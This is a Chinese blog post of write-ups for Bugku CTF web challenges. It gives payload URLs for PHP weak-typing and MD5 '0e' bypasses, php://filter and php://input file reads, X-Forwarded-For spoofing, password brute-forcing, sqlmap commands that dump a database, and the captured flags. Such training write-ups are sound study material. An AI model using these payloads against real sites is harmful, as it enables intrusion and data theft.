---
title: bugku-WEB
date: 2018-01-21 22:51:38
comments: true
---
## web2

> 听说聪明的人都能找到答案 <http://123.206.87.240:8002/web2/> 

送分题，查看源代码

```html
...
<body id="body" onLoad="init()">
<!flag KEY{Web-2-bugKssNNikls9100}>
<script type="text/javascript" src="js/ThreeCanvas.js"></script>
...
```

`KEY{Web-2-bugKssNNikls9100} `

## 计算器

> 地址：<http://123.206.87.240:8002/yanzhengma/> 

前端限制输入长度，直接控制台修改`maxlength`为一个大点的数就可以了

```html
<span id="code" class="nocode">验证码</span> <input type="text" class="input" maxlength="1"/> 
<button id="check">验证</button>  
```

修改后，做完计算提交验证弹出flag

`flag{CTF-bugku-0032}`

## web基础$_GET

> <http://123.206.87.240:8002/get/> 

```
$what=$_GET['what'];
echo $what;
if($what=='flag')
echo 'flag{****}';
```

基础，提交get请求`http://123.206.87.240:8002/get/?what=flag `即可

`flag{bugku_get_su8kej2en} `

## web基础$_POST

> <http://123.206.87.240:8002/post/> 

基础，提交post请求

![s2.png](https://i.loli.net/2019/03/24/5c9743082ad37.png)

`flag{bugku_get_ssseint67se}`

## 矛盾

> <http://123.206.87.240:8002/get/index1.php> 

```php
$num=$_GET['num'];
if(!is_numeric($num))
{
echo $num;
if($num==1)
echo 'flag{**********}';
}
```

利用php的弱类型，根据代码，num不能是数字，但num==1。因为php是弱类型，==不严格，所以使用1a，1'什么都可以绕过。payload`http://123.206.87.240:8002/get/index1.php?num=1a `

`flag{bugku-789-ps-ssdf} `

## web3

> flag就在这里快来找找吧 <http://123.206.87.240:8002/web3/> 

```html
<!--&#75;&#69;&#89;&#123;&#74;&#50;&#115;&#97;&#52;&#50;&#97;&#104;&#74;&#75;&#45;&#72;&#83;&#49;&#49;&#73;&#73;&#73;&#125;-->
```

Unicode转ASCII，一行代码完事。

`KEY{J2sa42ahJK-HS11III}`

## 域名解析

> 听说把 flag.baidu.com 解析到123.206.87.240 就能拿到flag 

修改hosts文件，在hosts最后加一行`123.206.87.240 flag.baidu.com`，在浏览器中访问flag.baidu.com即可

`KEY{DSAHDSJ82HDS2211} `

## 你必须让他停下

> 地址：<http://123.206.87.240:8002/web12/>
>
> 作者：@berTrAM

网页一直刷新，用Burp抓一下，一直在repeater里重放请求，刷新几次会刷到10.jpg，同时会返回flag

![s2.png](https://i.loli.net/2019/03/24/5c974de73e710.png)

`flag{dummy_game_1s_s0_popular}`

## 本地包含

> 地址：<http://123.206.87.240:8003/> 

题目挂了

## 变量1

> http://123.206.87.240:8004/index1.php

```php
flag In the variable ! <?php  

error_reporting(0);
include "flag1.php";
highlight_file(__file__);
if(isset($_GET['args'])){
    $args = $_GET['args'];
    if(!preg_match("/^\w+$/",$args)){
        die("args error!");
    }
    eval("var_dump($$args);");
}
?>
```

> **var_dump()** 函数用于输出变量的相关信息。
>
> **var_dump()** 函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。

正则表达式`/^\w+$/`限制了输入只能是字母和数字

> $$args 可变变量 http://www.php.net/manual/zh/language.variables.variable.php

题目中提到，flag在变量中，那么通过可变变量和`var_dump()`构造payload:`http://123.206.87.240:8004/index1.php?args=GLOBALS`

返回`array(7) { ["GLOBALS"]=> *RECURSION* ["_POST"]=> array(0) { } ["_GET"]=> array(1) { ["args"]=> string(7) "GLOBALS" } ["_COOKIE"]=> array(0) { } ["_FILES"]=> array(0) { } ["ZFkwe3"]=> string(38) "flag{92853051ab894a64f7865cf3c2128b34}" ["args"]=> string(7) "GLOBALS" } `

`flag{92853051ab894a64f7865cf3c2128b34}`

## web5

> JSPFUCK??????答案格式CTF{***\***}
>
> <http://123.206.87.240:8002/web5/>
>
> 字母大写

查看源代码，发现是JSFUCK，可以解密，也可以直接在console里执行，结果是`ctf{whatfk}`

`CTF{WHATFK}`

## 头等舱

> <http://123.206.87.240:9009/hd.php> 

看到题目，首先想到head

可以在Burp里抓，也可以在Chrome里直接看head

![s2.png](https://i.loli.net/2019/03/24/5c97552a88b4e.png)

`flag{Bugku_k8_23s_istra} `

## 网站被黑

> <http://123.206.87.240:8002/webshell/>
>
> 这个题没技术含量但是实战中经常遇到

扫目录发现`123.206.87.240:8002/webshell/shell.php`登录需要密码，扔到Burp里爆破密码。最后跑出来密码是`hack`

`flag{hack_bug_ku035} `

## 管理员系统

> <http://123.206.31.85:1003/>
>
> flag格式flag{}

直接访问，随便输一个用户名密码，提示`IP禁止访问，请联系本地管理员登陆，IP已被记录. `

使用Burpsuite拦截，在请求中加入`X-Forwarded-For: 127.0.0.1`伪造本地登录。

在返回的head底部，有一段`<!-- dGVzdDEyMw== -->`Base64解密后为`test123`

用户名为admin，密码为test123尝试登陆，返回flag

`flag{85ff2ee4171396724bae20c0bd851f6b}`

## web4

> 看看源代码吧
>
> <http://123.206.87.240:8002/web4/>

查看源代码

```javascript
var p1 = '%66%75%6e%63%74%69%6f%6e%20%63%68%65%63%6b%53%75%62%6d%69%74%28%29%7b%76%61%72%20%61%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%70%61%73%73%77%6f%72%64%22%29%3b%69%66%28%22%75%6e%64%65%66%69%6e%65%64%22%21%3d%74%79%70%65%6f%66%20%61%29%7b%69%66%28%22%36%37%64%37%30%39%62%32%62';
var p2 = '%61%61%36%34%38%63%66%36%65%38%37%61%37%31%31%34%66%31%22%3d%3d%61%2e%76%61%6c%75%65%29%72%65%74%75%72%6e%21%30%3b%61%6c%65%72%74%28%22%45%72%72%6f%72%22%29%3b%61%2e%66%6f%63%75%73%28%29%3b%72%65%74%75%72%6e%21%31%7d%7d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%6c%65%76%65%6c%51%75%65%73%74%22%29%2e%6f%6e%73%75%62%6d%69%74%3d%63%68%65%63%6b%53%75%62%6d%69%74%3b';
eval(unescape(p1) + unescape('%35%34%61%61%32' + p2));

```

对p1,'%35%34%61%61%32',p2进行URL解码，得到

```javascript
function checkSubmit(){var a=document.getElementById("password");if("undefined"!=typeof a){if("67d709b2b54aa2aa648cf6e87a7114f1"==a.value)return!0;alert("Error");a.focus();return!1}}document.getElementById("levelQuest").onsubmit=checkSubmit;
```

提交`67d709b2b54aa2aa648cf6e87a7114f1`得到flag

`KEY{J22JK-HS11} `

## flag在index里

> <http://123.206.87.240:8005/post/> 

在网页中可以跳转到`http://123.206.87.240:8005/post/index.php?file=show.php`

当时第一眼看到以为是通过file参数读文件，就直接尝试了`file=index.php和file=../index.php`等，发现并不行。

看了大佬的思路，学习了`php://filter`

关于`php://filter`有几篇文章不错：

- [谈一谈php://filter的妙用](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)
- [Bypassing PHP Null Byte Injection protections – Part II – CTF Write-up](https://www.securusglobal.com/community/2016/08/19/abusing-php-wrappers/)
- [php://filter 的使用](https://blog.csdn.net/destiny1507/article/details/82347371)
- [php://](https://blog.csdn.net/qq_40657585/article/details/83149305)

payload:`http://123.206.87.240:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php`

得到index.php内容的Base64编码

`PGh0bWw+DQogICAgPHRpdGxlPkJ1Z2t1LWN0ZjwvdGl0bGU+DQogICAgDQo8P3BocA0KCWVycm9yX3JlcG9ydGluZygwKTsNCglpZighJF9HRVRbZmlsZV0pe2VjaG8gJzxhIGhyZWY9Ii4vaW5kZXgucGhwP2ZpbGU9c2hvdy5waHAiPmNsaWNrIG1lPyBubzwvYT4nO30NCgkkZmlsZT0kX0dFVFsnZmlsZSddOw0KCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpew0KCQllY2hvICJPaCBubyEiOw0KCQlleGl0KCk7DQoJfQ0KCWluY2x1ZGUoJGZpbGUpOyANCi8vZmxhZzpmbGFne2VkdWxjbmlfZWxpZl9sYWNvbF9zaV9zaWh0fQ0KPz4NCjwvaHRtbD4NCg== `

解码得：

```php
<html>
    <title>Bugku-ctf</title>
    
<?php
	error_reporting(0);
	if(!$_GET[file]){echo '<a href="./index.php?file=show.php">click me? no</a>';}
	$file=$_GET['file'];
	if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){
		echo "Oh no!";
		exit();
	}
	include($file); 
//flag:flag{edulcni_elif_lacol_si_siht}
?>
</html>

```

`flag{edulcni_elif_lacol_si_siht}`

## 输入密码查看flag

> <http://123.206.87.240:8002/baopo/>
>
> 作者：Se7en

题目里有`请输入5位数密码查看，获取密码可联系我。 `直接爆破，得到密码`13579`

`flag{bugku-baopo-hah} `

## 点击一百万次

> <http://123.206.87.240:9001/test/>
>
> hints:JavaScript

看源代码中的JS

```javascript
var clicks=0
    $(function() {
      $("#cookie")
        .mousedown(function() {
          $(this).width('350px').height('350px');
        })
        .mouseup(function() {
          $(this).width('375px').height('375px');
          clicks++;
          $("#clickcount").text(clicks);
          if(clicks >= 1000000){
          	var form = $('<form action="" method="post">' +
						'<input type="text" name="clicks" value="' + clicks + '" hidden/>' +
						'</form>');
						$('body').append(form);
						form.submit();
          }
        });
    });
```

这里其实只需要post一个表单就可以了，clicks的值要大于1000000。

`flag{Not_C00kl3Cl1ck3r}`

## 备份是个好习惯

> <http://123.206.87.240:8002/web16/>
>
> 听说备份是个好习惯

说到备份就想到bak。访问`http://123.206.87.240:8002/web16/index.php.bak`获得index.php的备份文件。

```php
<?php
/**
 * Created by PhpStorm.
 * User: Norse
 * Date: 2017/8/6
 * Time: 20:22
*/

include_once "flag.php";
ini_set("display_errors", 0);
$str = strstr($_SERVER['REQUEST_URI'], '?');
$str = substr($str,1);
$str = str_replace('key','',$str);
parse_str($str);
echo md5($key1);

echo md5($key2);
if(md5($key1) == md5($key2) && $key1 !== $key2){
    echo $flag."取得flag";
}
?>
```

代码中的`$str = str_replace('key','',$str);`移除参数中的key可以用`kekeyy`之类的方法绕过。

最后的判断，`md5($key1) == md5($key2) && $key1 !== $key2`两个参数不一样，但他们的md5是一样的。这就涉及到php的md5绕过（Hash比较缺陷）。

PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。 

这里给出一部分可以通过php检查的md5

```
QNKCDZO
0e830400451993494058024219903391
 
s878926199a
0e545993274517709034328855841020
  
s155964671a
0e342768416822451524974117254469
  
s214587387a
0e848240448830537924465865611904
  
s214587387a
0e848240448830537924465865611904
  
s878926199a
0e545993274517709034328855841020
  
s1091221200a
0e940624217856561557816327384675

240610708
0e462097431906509019562988736854
```

随便构造一个payload：`http://123.206.87.240:8002/web16/index.php?kkeyey1=s878926199a&&kkeyey2=s155964671a`

另一个思路就是用数组绕过

在PHP中，MD5是不能处理数组的，md5(数组)会返回null，所以md5(a[])==null,md5(b[])==null，md5(a[])=md5(b[])=null 

payload：`http://123.206.87.240:8002/web16/index.php?kekeyy1[]=something&kekeyy2[]=anything`

`Bugku{OH_YOU_FIND_MY_MOMY} `

## 成绩单

> 快来查查成绩吧 <http://123.206.87.240:8002/chengjidan/> 

查看源代码，表单以post形式发送。

使用sqlmap一把梭。（与get不同，参数是--data=DATA） 

```
sqlmap.py -u http://123.206.87.240:8002/chengjidan/index.php --data="id=1" --dbs
sqlmap.py -u http://123.206.87.240:8002/chengjidan/index.php --data="id=1" -D skctf_flag --table
sqlmap.py -u -u http://123.206.87.240:8002/chengjidan/index.php --data="id=1" -D skctf_flag -T fl4g --dump
```

`BUGKU{Sql_INJECT0N_4813drd8hz4} `

## 秋名山老司机

> <http://123.206.87.240:8002/qiumingshan/>
>
> 是不是老司机试试就知道。

这种一看就知道，要写脚本了。

```python
import requests
import re
url = 'http://123.206.87.240:8002/qiumingshan/'
s = requests.session()
text = s.get(url) 
exp = re.search(r'(\d+[+\-*])+(\d+)',text.text).group() 
result = eval(exp)
post = {'value':result}
print(s.post(url,data=post).content)
```

`Bugku{YOU_DID_IT_BY_SECOND}`

## 速度要快

> 速度要快！！！！！！
>
> <http://123.206.87.240:8002/web6/>
>
> 格式KEY{xxxxxxxxxxxxxx}

又是一道脚本题

flag在head里，并用Base64编码

题目源码提示

`<!-- OK ,now you have to post the margin what you find --> `

拿到flag以后还要在post出去

```python
import requests
import base64

url = 'http://123.206.87.240:8002/web6/'
s = requests.session()  
re = s.get(url)
key = base64.b64decode(re.headers['flag'])
key = base64.b64decode(key.split(':')[1])
print (s.post(url,data={'margin':key}).text)
```

`KEY{111dd62fcd377076be18a}`

## cookies欺骗

> <http://123.206.87.240:8002/web11/>
>
> 答案格式：KEY{xxxxxxxx}

打开网页返回的是

```
rfrgrggggggoaihegfdiofi48ty598whrefeoiahfeiafehbaienvdivrbgtubgtrsgbvaerubaufibryrfrgrggggggoaihegfdiofi48ty598whrefeoiahfeiafehbaienvdivrbgtubgtrsgbvaerubaufibryrfrgrggggggoaihegfdiofi48ty598whrefeoiahfeiafehbaienvdivrbgtubgtrsgbvaerubaufibryrfrgrggggggoaihegfdiofi48ty598whrefeoiahfeiafehbaienvdivrbgtubgtrsgbvaerubaufibryrfrgrggggggoaihegfdiofi48ty598whrefeoiahfeiafehbaienvdivrbgtubgtrsgbvaerubaufibryrfrgrggggggoaihegfdiofi48ty598whrefeoiahfeiafehbaienvdivrbgtubgtrsgbvaerubaufibryrfrgrggggggoaihegfdiofi48ty598whrefeoiahfeiafehbaienvdivrbgtubgtrsgbvaerubaufibryrfrgrggggggoaihegfdiofi48ty598whrefeoiahfeiafehbaienvdivrbgtubgtrsgbvaerubaufibryrfrgrggggggoaihegfdiofi48ty598whrefeoiahfeiafehbaienvdivrbgtubgtrsgbvaerubaufibryrfrgrggggggoaihegfdiofi48ty598whrefeoiahfeiafehbaienvdivrbgtubgtrsgbvaerubaufibryrfrgrggggggoaihegfdiofi48ty598whrefeoiahfeiafehbaienvdivrbgtubgtrsgbvaerubaufibryrfrgrggggggoaihegfdiofi48ty598whrefeoiahfeiafehbaienvdivrbgtubgtrsgbvaerubaufibryrfrgrggggggoaihegfdiofi48ty598whrefeoiahfeiafehbaienvdivrbgtubgtrsgbvaerubaufibryrfrgrggggggoaihegfdiofi48ty598whrefeoiahfeiafehbaienvdivrbgtubgtrsgbvaerubaufibryrfrgrggggggoaihegfdiofi48ty598whrefeoiahfeiafehbaienvdivrbgtubgtrsgbvaerubaufibryrfrgrggggggoaihegfdiofi48ty598whrefeoiahfeiafehbaienvdivrbgtubgtrsgbvaerubaufibryrfrgrggggggoaihegfdiofi48ty598whrefeoiahfeiafehbaienvdivrbgtubgtrsgbvaerubaufibryrfrgrggggggoaihegfdiofi48ty598whrefeoiahfeiafehbaienvdivrbgtubgtrsgbvaerubaufibryrfrgrggggggoaihegfdiofi48ty598whrefeoiahfeiafehbaienvdivrbgtubgtrsgbvaerubaufibryrfrgrggggggoaihegfdiofi48ty598whrefeoiahfeiafehbaienvdivrbgtubgtrsgbvaerubaufibryrfrgrggggggoaihegfdiofi48ty598whrefeoiahfeiafehbaienvdivrbgtubgtrsgbvaerubaufibryrfrgrggggggoaihegfdiofi48ty598whrefeoiahfeiafehbaienvdivrbgtubgtrsgbvaerubaufibry
```

除了只能看出是`rfrgrggggggoaihegfdiofi48ty598whrefeoiahfeiafehbaienvdivrbgtubgtrsgbvaerubaufibry`的不断重复，什么也看不出来。

注意现在的URL，`http://123.206.87.240:8002/web11/index.php?line=&filename=a2V5cy50eHQ=`参数有意思。filename很明显是Base64。同理将index.php编码为Base64，并不断修改line的值，就读出了整个index.php

```php
<?php
error_reporting(0);
$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"");
$line=isset($_GET['line'])?intval($_GET['line']):0;
if($file=='') header("location:index.php?line=&filename=a2V5cy50eHQ=");
$file_list = array(
'0' =>'keys.txt',
'1' =>'index.php',
);
if(isset($_COOKIE['margin']) && $_COOKIE['margin']=='margin'){
$file_list[2]='keys.php';
}
if(in_array($file, $file_list)){
$fa = file($file);
echo $fa[$line];
}
?>
```

由代码可知，cookie里`margin=margin`即可，修改cookie后Response里就是flag

`KEY{key_keys}`

## never give up

> <http://123.206.87.240:8006/test/hello.php>
>
> 作者：御结冰城

注释第一行是`<!--1p.html--> `访问`123.206.87.240:8006/test/1p.html`就会发生跳转。

使用view-source查看源码`view-source:http://123.206.87.240:8006/test/1p.html`

```html
<HTML>
<HEAD>
<!--


var Words ="%3Cscript%3Ewindow.location.href%3D%27http%3A//www.bugku.com%27%3B%3C/script%3E%20%0A%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E" 
function OutWord()
{
var NewWords;
NewWords = unescape(Words);
document.write(NewWords);
} 
OutWord();
// -->
</SCRIPT>
</HEAD>
<BODY>
</BODY>
</HTML>
```

可以看到里面有编码。

用url解码`var Words`一次后得到

```html
<script>window.location.href='http://www.bugku.com';</script> 
<!--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ==-->
```

对剩余的再解Base64一次

```html
%22%3Bif%28%21%24_GET%5B%27id%27%5D%29%0A%7B%0A%09header%28%27Location%3A%20hello.php%3Fid%3D1%27%29%3B%0A%09exit%28%29%3B%0A%7D%0A%24id%3D%24_GET%5B%27id%27%5D%3B%0A%24a%3D%24_GET%5B%27a%27%5D%3B%0A%24b%3D%24_GET%5B%27b%27%5D%3B%0Aif%28stripos%28%24a%2C%27.%27%29%29%0A%7B%0A%09echo%20%27no%20no%20no%20no%20no%20no%20no%27%3B%0A%09return%20%3B%0A%7D%0A%24data%20%3D%20@file_get_contents%28%24a%2C%27r%27%29%3B%0Aif%28%24data%3D%3D%22bugku%20is%20a%20nice%20plateform%21%22%20and%20%24id%3D%3D0%20and%20strlen%28%24b%29%3E5%20and%20eregi%28%22111%22.substr%28%24b%2C0%2C1%29%2C%221114%22%29%20and%20substr%28%24b%2C0%2C1%29%21%3D4%29%0A%7B%0A%09require%28%22f4l2a3g.txt%22%29%3B%0A%7D%0Aelse%0A%7B%0A%09print%20%22never%20never%20never%20give%20up%20%21%21%21%22%3B%0A%7D%0A%0A%0A%3F%3E
```

再url解一次

```html
";if(!$_GET['id'])
{
	header('Location: hello.php?id=1');
	exit();
}
$id=$_GET['id'];
$a=$_GET['a'];
$b=$_GET['b'];
if(stripos($a,'.'))
{
	echo 'no no no no no no no';
	return ;
}
$data = @file_get_contents($a,'r');
if($data=="bugku is a nice plateform!" and $id==0 and strlen($b)>5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)
{
	require("f4l2a3g.txt");
}
else
{
	print "never never never give up !!!";
}


?>
```

最后所有的组合起来，代码是这样的

```html
<HTML>
<HEAD>
<!--


var Words ="<script>window.location.href='http://www.bugku.com';</script> 
<!-- ";if(!$_GET['id'])
{
	header('Location: hello.php?id=1');
	exit();
}
$id=$_GET['id'];
$a=$_GET['a'];
$b=$_GET['b'];
if(stripos($a,'.'))
{
	echo 'no no no no no no no';
	return ;
}
$data = @file_get_contents($a,'r');
if($data=="bugku is a nice plateform!" and $id==0 and strlen($b)>5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)
{
	require("f4l2a3g.txt");
}
else
{
	print "never never never give up !!!";
}


?> -->" 
function OutWord()
{
var NewWords;
NewWords = unescape(Words);
document.write(NewWords);
} 
OutWord();
// -->
</SCRIPT>
</HEAD>
<BODY>
</BODY>
</HTML>
```

因此，我们可以构造

```
id=%00或者id=.或者id=0e1

b=/0012345或者*12345或者?12345或者.12345(这里是运用了正则表达式的思想)

a=php://input
```

于是输入网址：
`http://123.206.87.240:8006/test/hello.php?id=.&a=php://input&b=.12345`

再用Burp Suite提交input数据流，得到flag

![s2.png](https://i.loli.net/2019/03/24/5c978125d642a.png)

`flag{tHis_iS_THe_fLaG}`

